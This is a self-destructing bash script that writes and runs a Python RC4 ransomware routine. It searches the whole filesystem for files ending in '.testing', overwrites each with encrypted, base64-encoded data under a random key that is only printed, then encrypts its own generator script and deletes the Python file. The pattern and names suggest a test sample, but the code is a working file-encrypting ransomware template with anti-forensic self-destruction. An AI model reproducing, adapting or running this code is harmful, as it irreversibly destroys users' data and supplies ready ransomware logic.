#!/bin/bash

tr_key=$(/bin/tr -dc A-Za-z0-9 </dev/urandom | /bin/head -c 128)

/bin/cat << EOF > test_rware.py

#!/usr/bin/env /bin/python3

import base64

key = "$tr_key"
print("Key used is : ", key)
def arc(data, key):
	x = 0
	box = range(256)
	for i in range(256):
		x = (x + box[i] + ord(key[i % len(key)])) % 256
		box = list(box)
		box[i], box[x] = box[x], box[i]
	x = 0
	y = 0
	out = []
	for char in data:
		x = (x + 1) % 256
		y = (y + box[x]) % 256
		box[x], box[y] = box[y], box[x]
		out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))

	return ''.join(out)

EOF

# insert file specifier here
find_command=$(/bin/find / -name "*.testing" 2>/dev/null)

for line in $find_command
do
	/bin/echo $line
	/bin/cat << EOF >> test_rware.py

with open("$line", 'r') as fr:
	plaintext = fr.read()
	arc_text = arc(plaintext, key)
	encoded_arc = arc_text.encode()
	base_text = base64.b64encode(encoded_arc)

with open("$line", 'wb') as fw:
	fw.write(base_text)

EOF

done


/bin/cat << EOF >> test_rware.py

with open("test_rware.py", 'r') as fr:
	plaintext = fr.read()
	arc_text = arc(plaintext, key)
	encoded_arc = arc_text.encode()
	base_text = base64.b64encode(encoded_arc)

with open("test_rware.py", 'wb') as fw:
	fw.write(base_text)

EOF

/bin/python3 test_rware.py

#####


tr_key2=$(/bin/tr -dc A-Za-z0-9 </dev/urandom | /bin/head -c 128)

/bin/cat << EOF > test_rware.py

#!/usr/bin/env /bin/python3

import base64
import subprocess

key = "$tr_key2"
print("Second Key used is : ", key)
def arc(data, key):
	x = 0
	box = range(256)
	for i in range(256):
		x = (x + box[i] + ord(key[i % len(key)])) % 256
		box = list(box)
		box[i], box[x] = box[x], box[i]
	x = 0
	y = 0
	out = []
	for char in data:
		x = (x + 1) % 256
		y = (y + box[x]) % 256
		box[x], box[y] = box[y], box[x]
		out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))

	return ''.join(out)

with open("self_destro_arc__RWARE__.sh", 'r') as fr:
	plaintext = fr.read()
	arc_text = arc(plaintext, key)
	encoded_arc = arc_text.encode()
	base_text = base64.b64encode(encoded_arc)

with open("self_destro_arc__RWARE__.sh", 'wb') as fw:
	fw.write(base_text)

subprocess.Popen(['/bin/rm','-f','test_rware.py'])

EOF

/bin/python3 test_rware.py

